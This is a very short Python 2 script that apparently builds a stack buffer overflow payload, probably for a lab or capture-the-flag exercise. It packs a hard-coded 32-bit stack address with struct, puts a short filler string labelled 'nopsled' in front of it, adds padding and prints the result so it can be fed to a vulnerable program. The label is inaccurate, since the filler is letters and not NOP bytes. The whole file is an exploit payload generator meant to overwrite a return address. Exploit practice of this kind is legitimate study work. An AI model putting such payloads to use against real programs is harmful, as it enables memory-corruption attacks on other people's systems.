import struct

addr = struct.pack("I", 0xbfffe6d0)
nopsled = "AAAABBBBC"
pad = "A"*30

print nopsled + addr + pad
